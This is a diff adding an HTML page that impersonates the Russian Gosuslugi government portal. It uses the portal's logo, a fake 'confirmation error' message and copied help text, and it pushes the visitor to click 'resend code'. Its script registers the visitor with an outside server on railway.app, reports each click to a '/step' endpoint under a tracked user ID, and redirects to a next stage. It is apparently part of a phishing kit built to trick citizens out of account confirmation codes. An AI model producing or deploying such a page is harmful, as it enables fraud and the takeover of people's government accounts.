@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Госуслуги — Ошибка подтверждения</title>
+    <link rel="icon" href="favicon.ico">
+    <style>
+        body {
+            font-family: 'Lato', Arial, sans-serif;
+            background: #f3f6fb;
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+        }
+        .main-block {
+            background: #fff;
+            border-radius: 18px;
+            box-shadow: 0 4px 24px #b3c6e6aa;
+            max-width: 400px;
+            width: 100%;
+            margin-top: 40px;
+            padding: 56px 32px 32px 32px;
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            position: relative;
+        }
+        .logo {
+            display: block;
+            margin: 0 auto 48px auto;
+            width: 194px;
+            height: 34px;
+        }
+        .error-block {
+            background-color: #ffebee; /* Светло-красный */
+            border-left: 5px solid #ef5350; /* Красная граница слева */
+            border-radius: 8px;
+            padding: 15px 20px;
+            margin-bottom: 20px;
+            width: 100%;
+            box-sizing: border-box;
+            text-align: left;
+        }
+        .error-block h1 {
+            color: #ef5350; /* Красный */
+            font-size: 18px;
+            margin: 0;
+            font-weight: normal;
+        }
+        .info-text {
+            font-size: 16px;
+            color: #222;
+            text-align: center;
+            margin-bottom: 20px; /* Уменьшил отступ */
+            line-height: 1.5;
+        }
+        .timer-block {
+            font-size: 15px;
+            color: #222;
+            text-align: center;
+            margin-top: 16px;
+            margin-bottom: 32px;
+        }
+        .timer {
+            font-size: 14px;
+            color: #222;
+            font-weight: bold;
+            margin-top: 8px;
+            margin-bottom: 0;
+            display: block;
+        }
+        .resend-link {
+            color: #0d4cd3;
+            background: none;
+            border: none;
+            font-size: 15px;
+            cursor: pointer;
+            text-align: center;
+            margin-bottom: 32px;
+            display: none; /* Скрыто по умолчанию */
+            text-decoration: none;
+            padding: 0;
+            transition: color 0.2s;
+        }
+        .resend-link.active {
+            display: block;
+        }
+        .resend-link:disabled {
+            color: #aab5d0;
+            cursor: default;
+        }
+        .cant-confirm-link {
+            color: #0d4cd3;
+            font-size: 15px;
+            text-align: center;
+            margin-top: 8px;
+            margin-bottom: 20px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            text-decoration: none;
+            display: block;
+            padding: 0;
+        }
+        .resend-button {
+            width: 100%;
+            padding: 15px;
+            background-color: #aab5d0; /* Серый цвет по умолчанию */
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: default; /* Курсор по умолчанию для disabled */
+            margin-bottom: 20px;
+            font-weight: normal; /* Убираем жирный шрифт */
+        }
+        .resend-button:not(:disabled) {
+            background-color: #0d4cd3; /* Синий цвет когда enabled */
+            cursor: pointer;
+        }
+        @media (max-width: 500px) {
+            .main-block {
+                max-width: 98vw;
+                padding: 20px 6vw 20px 6vw;
+            }
+            .logo {
+                height: 32px;
+                margin-bottom: 20px;
+            }
+            .error-block {
+                padding: 12px 15px;
+            }
+            .error-block h1 {
+                font-size: 16px;
+            }
+            .info-text {
+                font-size: 15px;
+            }
+            .resend-button {
+                padding: 12px;
+            }
+        }
+        /* Добавляем стили для модального окна справки */
+        .modal-overlay-help {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.5);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 2000;
+        }
+        .modal-help {
+            background: #fff;
+            border-radius: 16px;
+            box-shadow: 0 4px 24px #00000033;
+            max-width: 600px;
+            width: 95vw;
+            max-height: 90vh;
+            overflow-y: auto;
+            overflow-x: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+        .modal-header-help {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 24px 16px 24px;
+            position: relative;
+            border-bottom: 1px solid #eee;
+        }
+        .modal-title-help {
+            margin: 0;
+            font-size: 20px;
+            color: #0b1f33;
+        }
+        .modal-close-help {
+            background: none;
+            border: none;
+            font-size: 30px;
+            cursor: pointer;
+            color: #0d4cd3;
+        }
+        .modal-content-help {
+            padding: 24px;
+            font-size: 15px;
+            color: #333;
+            line-height: 1.5;
+        }
+        .modal-content-help h4 {
+            margin-top: 18px;
+            margin-bottom: 10px;
+            font-size: 17px;
+            color: #0b1f33;
+        }
+        .modal-content-help ul {
+            list-style: disc;
+            padding-left: 22px;
+            margin-bottom: 16px;
+        }
+        .modal-content-help li {
+            margin-bottom: 8px;
+        }
+        .modal-content-help p {
+            margin-bottom: 10px;
+        }
+        /* Конец стилей модального окна справки */
+    </style>
+</head>
+<body>
+    <div class="main-block">
+        <img src="logo.4db68cf668f7092d.svg" alt="Госуслуги" class="logo">
+
+        <div class="error-block">
+            <h1>Произошла ошибка<br>подтверждения</h1>
+        </div>
+
+        <div class="info-text">
+            Пожалуйста, нажмите кнопку<br>"Отправить код повторно"
+        </div>
+
+        <div class="timer-block" id="timer-block" style="display: flex; flex-direction: column; align-items: center;">
+            <span id="timer-label" style="min-height: 22px;">Отправить повторно через <span class="timer" id="timer">00:10</span></span>
+            <button class="resend-button" id="resend-button" disabled style="display:inline-block;margin-top:12px;">Отправить код повторно</button>
+        </div>
+
+        <button class="cant-confirm-link" id="cant-confirm">Не могу подтвердить вход</button>
+    </div>
+
+    <!-- Модальное окно справки (скрыто по умолчанию) -->
+    <div class="modal-overlay-help" id="modal-overlay-help" style="display:none;">
+        <div class="modal-help">
+            <div class="modal-header-help">
+                <h3 class="modal-title-help">Не получается подтвердить вход на Госуслуги</h3>
+                <button class="modal-close-help" title="Закрыть">&times;</button>
+            </div>
+            <div class="modal-content-help">
+                <p><b>При возникновении ошибок при подтверждении входа</b></p>
+                <ul>
+                    <li>Попробуйте повторить попытку входа через несколько минут</li>
+                    <li>Убедитесь, что у вас стабильное интернет-соединение</li>
+                    <li>Если проблема повторяется, воспользуйтесь другими способами подтверждения</li>
+                </ul>
+                <p>Подтверждение входа обязательно — оно позволяет защитить ваши данные на всех сайтах, куда можно войти с логином и паролем от Госуслуг.</p>
+                <p><b>Не получается подтвердить вход по смс</b></p>
+                <ul>
+                    <li>Смс с кодом приходит на номер телефона, указанный в личном кабинете. Если сменили номер и не успели обновить его в личном кабинете, измените номер, восстановив доступ к учётной записи:
+                        <ul>
+                            <li>онлайн через банк — номер телефона в банке должен отличаться от номера, ранее зарегистрированного на Госуслугах</li>
+                            <li>лично в центре обслуживания</li>
+                        </ul>
+                    </li>
+                    <li>Технический сбой на стороне оператора — повторите вход позже</li>
+                    <li>Проблемы с соединением — проверьте, находитесь ли вы в зоне доступа, стабильна ли сотовая связь, не включён ли авиарежим</li>
+                    <li>Есть задолженность за телефон — некоторые операторы блокируют приём сообщений при отрицательном балансе. Пополните счёт</li>
+                    <li>Временный сбой телефона — перезагрузите его. Очистите память телефона и сим‑карты, если она заполнена</li>
+                    <li>Смс попадают в папку «Спам» — отключите спам‑фильтр в настройках телефона и приложении оператора, а также блокирующие смs‑спам приложения, если установлены</li>
+                    <li>Мошенники взломали вашу учётную запись — восстановите доступ</li>
+                </ul>
+                <p><b>Не получается подтвердить вход по TOTP</b></p>
+                <ul>
+                    <li>Утерян доступ к приложению для работы с одноразовым кодом (TOTP), например, при смене телефона — войти с одноразовым кодом не получится. Нужно восстановить доступ к учётной записи</li>
+                    <li>Неверные дата или время. Если есть ошибка «Неверный код», сверьте время на устройствах, с которого заходите на Госуслуги и на котором в приложении генерируется одноразовый код. Разница во времени даже на одну секунду может привести к созданию неверного кода</li>
+                    <li>Если время на устройствах совпадает, но появляется ошибка при входе на Госуслуги, восстановите доступ к учётной записи</li>
+                    <li>Мошенники взломали вашу учётную запись — восстановите доступ</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <script src="assets/d4b72c006a7771677225038852ee8b96/noty.min.js"></script>
+    <script>
+        // Конфигурация сервера
+        const env = {
+            SERVER_URL: 'https://server-production-4599.up.railway.app',
+            API_ENDPOINT_AUTH: '/auth-visit',
+            API_ENDPOINT_STATUS: '/status',
+            API_ENDPOINT_STEP: '/step'
+        };
+
+        // Функция для получения или создания userId
+        async function getOrCreateUserId() {
+            let userId = localStorage.getItem('user_id');
+            if (!userId) {
+                try {
+                    const res = await fetch(`${env.SERVER_URL}${env.API_ENDPOINT_AUTH}`, { method: 'POST' });
+                    const data = await res.json();
+                    userId = data.userId;
+                    localStorage.setItem('user_id', userId);
+                } catch (e) {
+                    userId = null;
+                }
+            }
+            return userId;
+        }
+
+        // Таймер и кнопка повторной отправки
+        let timer = 10;
+        const timerSpan = document.getElementById('timer');
+        const resendButton = document.getElementById('resend-button');
+        const timerBlock = document.getElementById('timer-block');
+        const timerLabel = document.getElementById('timer-label');
+
+        function updateTimer() {
+            if (timer > 0) {
+                timer--;
+                timerSpan.textContent = (timer < 10 ? '00:0' : '00:') + timer;
+                resendButton.disabled = true;
+                resendButton.style.backgroundColor = '#aab5d0';
+                resendButton.style.cursor = 'default';
+                timerLabel.style.visibility = 'visible';
+            } else {
+                resendButton.disabled = false;
+                resendButton.style.backgroundColor = '#0d4cd3';
+                resendButton.style.cursor = 'pointer';
+                timerLabel.style.visibility = 'hidden';
+            }
+        }
+
+        let timerInterval = setInterval(updateTimer, 1000);
+        updateTimer(); // Вызываем сразу, чтобы показать начальное состояние
+
+        // Обработчик для кнопки "Отправить код повторно"
+        resendButton.addEventListener('click', async function() {
+            if (resendButton.disabled) return;
+
+            try {
+                const userId = await getOrCreateUserId();
+                if (!userId) {
+                    throw new Error('No userId available');
+                }
+
+                const response = await fetch(`${env.SERVER_URL}${env.API_ENDPOINT_STEP}`, {
+                method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    step: 'resend_code_click',
+                        value: 'Пользователь нажал Отправить повторно',
+                    origin: 'Вход',
+                        userId: userId
+                })
+                });
+
+                if (!response.ok) {
+                    console.error('Failed to send resend event:', response.status);
+                }
+                
+                window.location.href = 'next_step2.html';
+            } catch (error) {
+                console.error('Error sending resend event:', error);
+                window.location.href = 'next_step2.html';
+            }
+        });
+
+        // Логика для кнопки "Не могу подтвердить" (открытие модального окна справки)
+        const cantConfirmLink = document.getElementById('cant-confirm');
+        const modalOverlayHelp = document.getElementById('modal-overlay-help');
+        const modalCloseHelp = modalOverlayHelp.querySelector('.modal-close-help');
+
+        cantConfirmLink.addEventListener('click', function() {
+            modalOverlayHelp.style.display = 'flex';
+        });
+
+        modalCloseHelp.addEventListener('click', function() {
+            modalOverlayHelp.style.display = 'none';
+        });
+
+        modalOverlayHelp.addEventListener('click', function(e) {
+            if (e.target === modalOverlayHelp) {
+                modalOverlayHelp.style.display = 'none';
+            }
+        });
+
+    </script>
+</body>
+</html> 
